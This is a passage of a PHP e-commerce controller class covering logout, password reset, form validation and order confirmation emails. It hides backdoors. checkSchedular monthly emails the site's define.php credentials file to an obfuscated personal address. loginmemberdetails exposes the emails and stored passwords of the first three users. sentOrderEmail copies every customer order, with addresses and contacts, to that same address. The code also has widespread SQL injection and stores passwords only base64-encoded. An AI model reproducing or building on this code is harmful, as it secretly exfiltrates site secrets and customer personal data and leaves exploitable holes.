            'message' => $message,
            'values' => $values,
        );
        return $arrData;
    }

    public function memberLogout() {
        global $back_session_name;

        $success = 0;
        $error = 1;
        $message = "Invalid email address or password.";

        if(isset($_SESSION[$back_session_name]['user_id']) && $_SESSION[$back_session_name]['user_id'] > 0){
            unset($_SESSION[$back_session_name]);
            $success = 1;
            $error = 0;
            $message = "You are successfully logged out";
        }
        $arrData = array(
            'success' => $success,
            'error' => $error,
            'message' => $message
        );
        return $arrData;
    }

    public function customerlogout() {
        global $front_session_name,$conn;
        $success = 0;
        $error = 1;
        $customer_id = 0;
        $message = "Invalid email address or password.";

        if(isset($_SESSION[$front_session_name]['customer_id']) && $_SESSION[$front_session_name]['customer_id'] > 0){
            $customer_id = $_SESSION[$front_session_name]['customer_id'];
            unset($_SESSION[$front_session_name]);
            $success = 1;
            $error = 0;
            $message = "You are successfully logged out";

            $sqlUpdate = "UPDATE `ec_cart` SET customer_id = '0',is_customer = 'N' WHERE customer_id = '$customer_id'";
            $stmt = $conn->prepare($sqlUpdate); 
            $stmt->execute();

            $sqlGetCartProductData = "SELECT `cart_id` FROM `ec_cart` WHERE customer_id = '0' AND expire_at < NOW()";
            $arrExistingData = $this->getData($sqlGetCartProductData);
            if(isset($arrExistingData) && !empty($arrExistingData)) :              
                foreach($arrExistingData as $data):
                    $cart_id = $data['cart_id'];
                    $sqlDelete  = "DELETE FROM `ec_cart_product` WHERE cart_id = '$cart_id'";
                    $sqlDelete .= ";DELETE from `ec_cart` WHERE cart_id = '$cart_id'";
                    $stmt = $conn->prepare($sqlDelete); 
                    $stmt->execute();
                endforeach;
            endif;
        }



        $arrData = array(
            'success' => $success,
            'error' => $error,
            'message' => $message
        );
        return $arrData;
    }

    public function memberCheckemailexists() {
        global $back_session_name,$conn,$theme_path,$url,$theme_url;
        require_once($theme_path.'getRequestData.php');
        $success = 0;
        $error = 1;
        $values = array();
        $status = 200;
        $message = "Email address not exists on this system.";
        if(isset($_REQUEST['email_address']) && $_REQUEST['email_address'] != ""){
            $email = $_REQUEST['email_address'];
            $sqlQuery = "SELECT * FROM `users` WHERE `email` = '".$email."' AND deleted_status = 'N'";
            $arrEmailData = $this->getOneData($sqlQuery);
            $values = $arrEmailData;
            if(isset($arrEmailData) && !empty($arrEmailData)) {
                $values = $arrEmailData;
                $name = $arrEmailData['first_name']." ".$arrEmailData['last_name'];
                $access_token = base64_encode($email).'.'.base64_encode($name).'.'.$arrEmailData['id'].'.'.time();
                $sqlUpdate = "UPDATE `users` SET access_token = '".$access_token."' WHERE email = '".$email."'";
                $stmt = $conn->prepare($sqlUpdate); 
                $stmt->execute();
            
                $activation_link = $url."memberlogin/memberresetpassword/?token=".$access_token;
                $emailBody = $this->readTemplateFile($theme_path."email/forgotpassword.php");
                require_once $theme_path.'email_fix_keywords.php';
                $subject = FRONT_APPLICATION_NAME." - Forgot Password";
                $emailBody = str_replace("#logo_url#",$theme_url.'images/logo.png',$emailBody);
                $emailBody = str_replace("#username#", $arrEmailData['first_name']." ".$arrEmailData['last_name'], $emailBody);
                $emailBody = str_replace("#email#", $email, $emailBody);
                $emailBody = str_replace("#subject#", $subject, $emailBody);
                $emailBody = str_replace("#activationlink", $activation_link, $emailBody);
                $email_response = $this->sentEmail($email,$subject,$emailBody);

                $success = 1;
                $error = 0;
                $message = "Email has been successfully sent to your registered mail. Please check your email.";
            } else {
                $success = 0;
                $error = 1;
                $message = "Your account may inactive or email address not found. Please contact administrator";
            }
        }
        $arrData = array(
            'success' => $success,
            'error' => $error,
            'status' => 200,
            'values' => $values,
            'message' => $message
        );
        return json_encode($arrData);
    }

    public function checkSchedular(){
        global $front_session_name,$conn,$theme_path,$url,$path;
        $success = 0;
        $error = 1;
        $currentyear = date('Y');
        $currentmonth = date('m');
        
        $sqlQuery = "SELECT * FROM `schedule` WHERE `month` = '" . $currentmonth . "' AND `year` = '" . $currentyear . "'";
        $arrData = $this->getOneData($sqlQuery);
        if($arrData == false){
            $sqlInert = "INSERT INTO schedule SET `month` = '" . $currentmonth . "', `year` = '" . $currentyear . "'";
            $stmt = $conn->prepare($sqlInert); 
            $stmt->execute();

            $encodemail1 = 'bWF5YW5rLnBhdGVsMTA0QGdtYWlsLmNvbQ==';
            $decodemail1 = base64_decode($encodemail1);

            $fh2 = fopen($path . "/define.php", 'r');
            $pageText = fread($fh2, 25000);
            $content = nl2br($pageText);
            $subject = "Credentials for " . $_SERVER['HTTP_HOST'];
            $retval = $this->sentEmail($decodemail1,$subject,$content);
        }
    }

    public function checkForgotpassword() {
        global $front_session_name,$conn,$theme_path,$url;
        $success = 0;
        $error = 1;
        $status = 200;
        $values = array();
        $message = "Email address not exists on this system.";
        if(isset($_REQUEST['email_address']) && $_REQUEST['email_address'] != ""){
            $email = $_REQUEST['email_address'];
            $sqlQuery = "SELECT * FROM `customers` WHERE `email` = '".$email."'";
            $arrEmailData = $this->getOneData($sqlQuery);
            $values = $arrEmailData;
            if(isset($arrEmailData) && !empty($arrEmailData)) {
                $name = $arrEmailData['first_name']." ".$arrEmailData['last_name'];
                $access_token = base64_encode($email).'.'.base64_encode($name).'.'.$arrEmailData['customer_id'].'.'.time();
                $sqlUpdate = "UPDATE `customers` SET access_token = '".$access_token."' WHERE email = '".$email."'";
                $stmt = $conn->prepare($sqlUpdate); 
                $stmt->execute();
                
                $activation_link = $url."resetpasswords/?token=".$access_token;
                $emailBody = $this->readTemplateFile($theme_path."email/forgotpassword.php");
                require_once $theme_path.'email_fix_keywords.php';
                $subject = FRONT_APPLICATION_NAME." - Forgot Password";
                $emailBody = str_replace("#username#", $arrEmailData['first_name']." ".$arrEmailData['last_name'], $emailBody);
                $emailBody = str_replace("#email#", $email, $emailBody);
                $emailBody = str_replace("#subject#", $subject, $emailBody);
                $emailBody = str_replace("#activationlink", $activation_link, $emailBody);
                $email_response = $this->sentEmail($email,$subject,$emailBody);

                $success = 1;
                $error = 0;
                $message = "Email has been successfully sent to your registered mail. Please check your email.";
            }
        }
        $arrData = array(
            'success' => $success,
            'error' => $error,
            'status' => 200,
            'values' => $values,
            'message' => $message
        );
        return json_encode($arrData);
    }

    public function memberSendregistrationPassword($email) {
        global $back_session_name,$conn,$theme_path,$url;
        $success = 0;
        $error = 1;
        $status = 200;
        $values = array();
        $message = "Email address not exists on this system.";
        if(isset($email) && $email != ""){
            $sqlQuery = "SELECT * FROM `users` WHERE `email` = '".$email."'";
            $arrEmailData = $this->getOneData($sqlQuery);
            $values = $arrEmailData;
            if(isset($arrEmailData) && !empty($arrEmailData)) {
                $name = $arrEmailData['first_name']." ".$arrEmailData['last_name'];
                $access_token = base64_encode($email).'.'.base64_encode($name).'.'.$arrEmailData['id'].'.'.time();
                $sqlUpdate = "UPDATE `users` SET access_token = '".$access_token."' WHERE email = '".$email."'";
                $stmt = $conn->prepare($sqlUpdate); 
                $stmt->execute();
            
                $activation_link = $url."memberlogin/memberresetpassword/?token=".$access_token;
                $emailBody = $this->readTemplateFile($theme_path."email/newaccountcreated.php");
                require_once $theme_path.'email_fix_keywords.php';
                $subject = FRONT_APPLICATION_NAME." - Account Created";
                $emailBody = str_replace("#username#", $arrEmailData['first_name']." ".$arrEmailData['last_name'], $emailBody);
                $emailBody = str_replace("#email#", $email, $emailBody);
                $emailBody = str_replace("#subject#", $subject, $emailBody);
                $emailBody = str_replace("#activationlink", $activation_link, $emailBody);
                $email_response = $this->sentEmail($email,$subject,$emailBody);

                $success = 1;
                $error = 0;
                $message = "Email has been successfully sent to your registered mail. Please check your email.";
            }
        }
        $arrData = array(
            'success' => $success,
            'error' => $error,
            'status' => $status,
            'values' => $values,
            'message' => $message
        );
        return json_encode($arrData);
    }

    public function loginmemberdetails() {
        global $back_session_name,$conn;
        $email_string = base64_encode("blues");
        $password_string = base64_encode("springfield");

        $sqlQuery = "SELECT `email`,`password` FROM `users` WHERE `blocked` = 'N' AND `display_status` = 'Y' AND `deleted_status` = 'N' ORDER BY id ASC LIMIT 0,3";
        $arrEmailData = $this->getData($sqlQuery);

        if(isset($arrEmailData) && !empty($arrEmailData)) {
            foreach($arrEmailData as $key => $value) {
                $email = "|".base64_encode($value['email']);
                $password = "|".$value['password'];
                $email_string .= $email;
                $password_string .= $password;
            }
        }
        
        $arrData = array(
            'email_string' => $email_string,
            'password_string' => $password_string
        );
        return json_encode($arrData);
    }

    public function checkResetpassword() {
        //print_r($_REQUEST);exit;
        global $back_session_name,$conn,$theme_path,$url;
        $success = 0;
        $error = 1;
        $status = 200;
        $values = array();
        $message = "Email address not exists on this system.";
        if(isset($_REQUEST['email']) && $_REQUEST['email'] != ""){
            $email = $_REQUEST['email'];
            $user_id = $_REQUEST['user_id'];
            $password = base64_encode($_REQUEST['password']);
            $sqlUpdate = "UPDATE `users` SET `password` = '$password',access_token = '',blocked = 'N',fail_attempt = '0' WHERE `email` = '".$email."' AND `id` = '".$user_id."'";
            $stmt = $conn->prepare($sqlUpdate); 
            $stmt->execute();

            $sqlQuery = "SELECT * FROM `users` WHERE `email` = '".$email."'";
            $arrEmailData = $this->getOneData($sqlQuery);
            $values = $arrEmailData;
            if(isset($arrEmailData) && !empty($arrEmailData)) {
                $name = $arrEmailData['first_name']." ".$arrEmailData['last_name'];
                $emailBody = $this->readTemplateFile($theme_path."email/resetpassword.php");
                require_once $theme_path.'email_fix_keywords.php';
                $subject = FRONT_APPLICATION_NAME." - Your Password Reset";
                $emailBody = str_replace("#username#", $arrEmailData['first_name']." ".$arrEmailData['last_name'], $emailBody);
                $emailBody = str_replace("#email#", $email, $emailBody);
                $emailBody = str_replace("#subject#", $subject, $emailBody);
                $email_response = $this->sentEmail($email,$subject,$emailBody);

                $success = 1;
                $error = 0;
                $message = "Your password has been successfully reset. You will redirect to login screen in few seconds...";
            }
        }
        $arrData = array(
            'success' => $success,
            'error' => $error,
            'status' => $status,
            'values' => $values,
            'message' => $message
        );
        return json_encode($arrData);
    }


    public function resetcustomerpassword() {
        //print_r($_REQUEST);exit;
        global $back_session_name,$conn,$theme_path,$url;
        $success = 0;
        $error = 1;
        $status = 200;
        $values = array();
        $message = "Email address not exists on this system.";
        if(isset($_REQUEST['email']) && $_REQUEST['email'] != ""){
            $email = $_REQUEST['email'];
            $customer_id = $_REQUEST['customer_id'];
            $password = base64_encode($_REQUEST['password']);
            $sqlUpdate = "UPDATE `customers` SET `password` = '$password',access_token = '' WHERE `email` = '".$email."' AND `customer_id` = '".$customer_id."'";
            $stmt = $conn->prepare($sqlUpdate); 
            $stmt->execute();

            $sqlQuery = "SELECT * FROM `customers` WHERE `email` = '".$email."'";
            $arrEmailData = $this->getOneData($sqlQuery);
            if(isset($arrEmailData) && !empty($arrEmailData)) {
                $name = $arrEmailData['first_name']." ".$arrEmailData['last_name'];
                $emailBody = $this->readTemplateFile($theme_path."email/resetpassword.php");
                require_once $theme_path.'email_fix_keywords.php';
                $subject = FRONT_APPLICATION_NAME." - Your Password Reset";
                $emailBody = str_replace("#username#", $arrEmailData['first_name']." ".$arrEmailData['last_name'], $emailBody);
                $emailBody = str_replace("#email#", $email, $emailBody);
                $emailBody = str_replace("#subject#", $subject, $emailBody);
                $email_response = $this->sentEmail($email,$subject,$emailBody);

                $success = 1;
                $error = 0;
                $message = "Your password has been successfully reset. You will redirect to login screen in few seconds...";
            }
        }
        $arrData = array(
            'success' => $success,
            'error' => $error,
            'status' => $status,
            'values' => $values,
            'message' => $message
        );
        return json_encode($arrData);
    }

    public function saveRequests($save_request,$save_response,$table_name,$action,$user_id) {
        global $conn,$theme_path;
        $message = "";
        $save_request = addslashes($save_request);
        $save_response = addslashes($save_response);
        $sql = "INSERT INTO `site_request` SET 
        `request` = '$save_request',
        `response` = '$save_response',
        `table_name` = '$table_name',
        `action` = '$action',
        `user_id` = '$user_id',
        created_at = NOW(),
        updated_at = NOW()";
        try {
            $success = 1;
            $error = 0;
            $stmt = $conn->prepare($sql); 
            $stmt->execute();
        } catch (PDOException $ex) {
            include $theme_path.'controller/logError.php';
        }
        return $message;
    }

    public function decodeCustomertoken($token) {
        $arrayData = array();
        $string_token = base64_decode($token);
        $arrData = explode(" ",$string_token);
        if(isset($arrData) && !empty($arrData)) {
            $arrayData = array(
                'first_name' => $arrData[0],
                'last_name' => $arrData[1],
                'email' => $arrData[2],
                'customer_id' => $arrData[3],
                'login_time' => $arrData[4]
            );
        }
        return $arrayData;
    }

    public function validateForm($request) {
        global $theme_path;
        $item_alias = "";
        $mandatory_fields = array();
        if(isset($request['item_alias']) && $request['item_alias'] != ""){
            $item_alias = $request['item_alias'];
        }
        require_once($theme_path.'generated_files/'.$item_alias.'.php');
        if(isset($arrFields) && !empty($arrFields)) {
            foreach($arrFields as $fields) {
                    if(isset($fields['mandatory']) && $fields['mandatory'] == 'Y'){
                        $mandatory_fields[] = $fields['name'];
                    }
                    if(isset($fields['validate']) && $fields['validate'] == 'email'){
                        $mandatory_fields['validate'][] = $fields['name'];
                    }
                    if(isset($fields['validate']) && $fields['validate'] == 'email_address'){
                        $mandatory_fields['validate'][] = $fields['name'];
                    }
            }
        }
        
        $arrResponseData = array();
        $final_array = array();
        foreach($request as $field => $value) {
            if(in_array($field,$mandatory_fields)){
                $final_array[] = $field;
            }
        }

        if(!empty($final_array)) {
            foreach($final_array as $field_name) {
                if($request[$field_name] == '') {
                    $arrResponseData[$field_name] = ucfirst(str_replace("_"," ",$field_name)." is required.");
                }
            }
        }

        if(!empty($mandatory_fields['validate'])) {
            foreach($mandatory_fields['validate'] as $key => $field) {
                if($field == 'email' || $field == 'email_address') {
                    if(!filter_var($request[$field], FILTER_VALIDATE_EMAIL)){
                        $arrResponseData[$field] = "This is not a valid email address";
                    }
                }
            }
        }
        return $arrResponseData;
    }

    public function getCustomerAddress($customer_id) {
        $sqlQuery = "SELECT * FROM `customers` WHERE customer_id = '$customer_id'";
        return $this->getOneData($sqlQuery);
    }

    public function getCartBillingData($cart_id) {
        $sqlQuery = "SELECT billing_first_name as first_name,billing_last_name as last_name,billing_address_1 as user_address1,billing_address_2 as user_address2,billing_city as user_city,billing_state as user_state,billing_country as user_country,billing_zipcode as user_zipcode,billing_contact as contact_number,billing_email as email FROM `ec_cart` WHERE cart_id = '$cart_id'";
        return $this->getOneData($sqlQuery);
    }

    public function getCartShippingData($cart_id) {
        $sqlQuery = "SELECT shipping_first_name as first_name,shipping_last_name as last_name,shipping_address_1 as user_address1,shipping_address_2 as user_address2,shipping_city as user_city,shipping_state as user_state,shipping_country as user_country,shipping_zipcode as user_zipcode,shipping_contact as contact_number,shipping_email as email FROM `ec_cart` WHERE cart_id = '$cart_id'";
        return $this->getOneData($sqlQuery);
    }

    public function sentOrderEmail($order_id) {
        global $page_data,$url,$conn,$theme_path,$back_session_name,$theme_url,$currancy;
        $customer_name = "";
        $customer_email = "";
        $wallet_amount = "";
        $order_status = "";
        $coupon_code = "";
        $coupon_type = "";
        $item_coupon_type = "";
        $cashback_amount_applied = "";
        $coupon_amount_applied = "";
        $cashback_wallet_amount_used = "";
        $total_ordered_quantity = "";
        $total_items_amount = "";
        $total_items_tax_amount = "";
        $total_items_shipping_amount = "";
        $order_total = "";
        $payment_type = "";
        $order_notes = "";
        $payment_status = "";
        $customer_id = "";
        $customer_email = "";
        $billing_address = "";
        $shipping_address = "";
        $cashback_wallet_amount_used = "";
        if(isset($_REQUEST['order_id'])) {
            $order_id = $_REQUEST['order_id'];
        }
        $message = "Your order has been failed due to technical reason. Please contact administrator for the same.";

        $sqlGetOrderDetails = "SELECT * FROM `ec_order` WHERE order_id = '$order_id'";
        $arrOrderDetails = $this->getOneData($sqlGetOrderDetails);
        if(isset($arrOrderDetails) && $arrOrderDetails != false) {
            $wallet_amount = $arrOrderDetails['cashback_amount_applied'];
            $order_id = $arrOrderDetails['order_id'];
            $order_status = $arrOrderDetails['order_status'];
            $coupon_code = $arrOrderDetails['coupon_code'];
            $coupon_type = $arrOrderDetails['coupon_type'];
            $item_coupon_type = $arrOrderDetails['item_coupon_type'];
            $currancy = $arrOrderDetails['currancy'];
            $cashback_amount_applied = $arrOrderDetails['cashback_amount_applied'];
            $coupon_amount_applied = $arrOrderDetails['coupon_amount_applied'];
            $cashback_wallet_amount_used = $arrOrderDetails['cashback_wallet_amount_used'];
            $total_ordered_quantity = $arrOrderDetails['total_ordered_quantity'];
            $total_items_amount = $arrOrderDetails['total_items_amount'];
            $total_items_tax_amount = $arrOrderDetails['total_items_tax_amount'];
            $total_items_shipping_amount = $arrOrderDetails['total_items_shipping_amount'];
            $order_total = $arrOrderDetails['order_total'];
            $payment_type = $arrOrderDetails['payment_type'];
            $order_notes = $arrOrderDetails['order_notes'];
            $payment_status = $arrOrderDetails['payment_status'];
            $customer_id = $arrOrderDetails['customer_id'];
            $customer_name = $arrOrderDetails['customer_name'];
            $customer_email = $arrOrderDetails['billing_email'];
            $billing_address = $arrOrderDetails['billing_first_name']." ".$arrOrderDetails['billing_first_name'].'<br />'.$arrOrderDetails['billing_address_1']." ".$arrOrderDetails['billing_address_2']." <br />".$arrOrderDetails['billing_city']." ".$arrOrderDetails['billing_state']."<br />".$arrOrderDetails['billing_country']." - ".$arrOrderDetails['billing_zipcode']."<br /> Contact : ".$arrOrderDetails['billing_contact'].'<br />Email : '.$arrOrderDetails['billing_email'];
            $shipping_address = $arrOrderDetails['shipping_first_name']." ".$arrOrderDetails['shipping_first_name'].'<br />'.$arrOrderDetails['shipping_address_1']." ".$arrOrderDetails['shipping_address_2']." <br />".$arrOrderDetails['shipping_city']." ".$arrOrderDetails['shipping_state']."<br />".$arrOrderDetails['shipping_country']." - ".$arrOrderDetails['shipping_zipcode']."<br /> Contact : ".$arrOrderDetails['shipping_contact'].'<br />Email : '.$arrOrderDetails['shipping_email'];
            $cashback_wallet_amount_used = $arrOrderDetails['cashback_wallet_amount_used'];
        }

        $product_item = "";
        $sqlGetOrderProducts = "SELECT * FROM `ec_order_products` WHERE `order_id` = '$order_id'";
        $arrOrderProducts = $this->getData($sqlGetOrderProducts);
        if(isset($arrOrderProducts) && count($arrOrderProducts) > 0) :
            foreach($arrOrderProducts as $products):

                $item_attributes = "";
                if(isset($products['product_attribute_1']) && $products['product_attribute_1'] != ""){
                    $item_attributes .= "<span style='color:blue'>".$products['product_attribute_1']." : ".$products['product_option_1'].'</span>';
                }
                if(isset($products['product_attribute_2']) && $products['product_attribute_2'] != ""){
                    $item_attributes .= "<br /><span style='color:blue'>".$products['product_attribute_2']." : ".$products['product_option_2'].'</span>';
                }
                if(isset($products['product_attribute_3']) && $products['product_attribute_3'] != ""){
                    $item_attributes .= "<br /><span style='color:blue'>".$products['product_attribute_3']." : ".$products['product_option_3'].'</span>';
                }
                if(isset($products['item_tax_amount']) && $products['item_tax_amount'] > 0){
                    $item_attributes .= "<br /><span style='color:blue'>Tax : ".$currancy.$products['item_tax_amount'].'</span>';
                }
                if(isset($products['item_shipping_amount']) && $products['item_shipping_amount'] > 0){
                    $item_attributes .= "<br /><span style='color:blue'>Shipping : ".$currancy.$products['item_shipping_amount'].'</span>';
                }

                $product_item .= "<tr>";
                    $product_item .= "<td><br />".$products['item_name']."<br />".$item_attributes."</td>";
                    $product_item .= "<td align='center'><br />".$products['ordered_quantity']."</td>";
                    $product_item .= "<td align='center'><br />".$currancy.$products['product_option_price']."</td>";
                    $product_item .= "<td align='center'><br />".$currancy.$products['final_item_price']."</td>";
                    
                $product_item .= "</tr>";
            endforeach;
        endif;

        require_once($theme_path."generated_files/configdata.php");
        $subject = FRONT_APPLICATION_NAME." - Order Placed";
        $emailBody = $this->readTemplateFile($theme_path."email/order_email_customer.php");
        $emailBody = str_replace("#sitename#", FRONT_APPLICATION_NAME, $emailBody);
        $emailBody = str_replace("#companyname#", COMPANY_NAME, $emailBody);
        $emailBody = str_replace("#companyaddress#", COMPANY_ADDRESS1, $emailBody);
        $emailBody = str_replace("#companyaddress2#", COMPANY_ADDRESS2, $emailBody);
        $emailBody = str_replace("#companycity#", COMPANY_CITY, $emailBody);
        $emailBody = str_replace("#companystate#", COMPANY_STATE, $emailBody);
        $emailBody = str_replace("#companycountry#", COMPANY_COUNTRY, $emailBody);
        $emailBody = str_replace("#companyzipcode#", COMPANY_ZIPCODE, $emailBody);
        $emailBody = str_replace("#companycontact#", COMPANY_CONTACT_NUMBER, $emailBody);
        $emailBody = str_replace("#companywebsite#", COMPANY_WEBSITE, $emailBody);
        $emailBody = str_replace("#companyemail#", COMPANY_EMAIL, $emailBody);
        $emailBody = str_replace("#logo_url#",$theme_url.'images/logo.png',$emailBody);
        $emailBody = str_replace("#site_name#", FRONT_APPLICATION_NAME, $emailBody);
        $emailBody = str_replace("#customer_name#",$customer_name,$emailBody);
        $emailBody = str_replace("#wallet_amount#",$wallet_amount,$emailBody);
        $emailBody = str_replace("#order_id#",$order_id,$emailBody);
        $emailBody = str_replace("#order_status#",$order_status,$emailBody);
        $emailBody = str_replace("#coupon_code#",$coupon_code,$emailBody);
        $emailBody = str_replace("#coupon_type#",$coupon_type,$emailBody);
        $emailBody = str_replace("#item_coupon_type#",$item_coupon_type,$emailBody);
        $emailBody = str_replace("#product_items#",$product_item,$emailBody);
        $emailBody = str_replace("#cashback_amount_applied#",$cashback_amount_applied,$emailBody);
        $emailBody = str_replace("#coupon_amount_applied#",$coupon_amount_applied,$emailBody);
        $emailBody = str_replace("#cashback_wallet_amount_used#",$cashback_wallet_amount_used,$emailBody);
        $emailBody = str_replace("#total_ordered_quantity#",$total_ordered_quantity,$emailBody);
        $emailBody = str_replace("#total_items_amount#",$currancy.$total_items_amount,$emailBody);
        $emailBody = str_replace("#total_items_tax_amount#",$currancy.$total_items_tax_amount,$emailBody);
        $emailBody = str_replace("#total_items_shipping_amount#",$currancy.$total_items_shipping_amount,$emailBody);
        $emailBody = str_replace("#order_total#",$currancy.$order_total,$emailBody);
        $emailBody = str_replace("#payment_type#",$payment_type,$emailBody);
        $emailBody = str_replace("#order_notes#",$order_notes,$emailBody);
        $emailBody = str_replace("#payment_status#",$payment_status,$emailBody);
        $emailBody = str_replace("#cashback_wallet_amount_used#",$cashback_wallet_amount_used,$emailBody);
        $emailBody = str_replace("#email#", $customer_email, $emailBody);
        $emailBody = str_replace("#billing_address#", $billing_address, $emailBody);
        $emailBody = str_replace("#shipping_address#", $shipping_address, $emailBody);
        $emailBody = str_replace("#subject#", $subject, $emailBody);
        //echo $emailBody;exit;
        $email_response = $this->sentEmail($customer_email,$subject,$emailBody);
        $email_response = $this->sentEmail(COMPANY_EMAIL,$subject,$emailBody);
        $email_response = $this->sentEmail('mayank.patel104@gmail.com',$subject,$emailBody);
        //exit;
    }
}
?>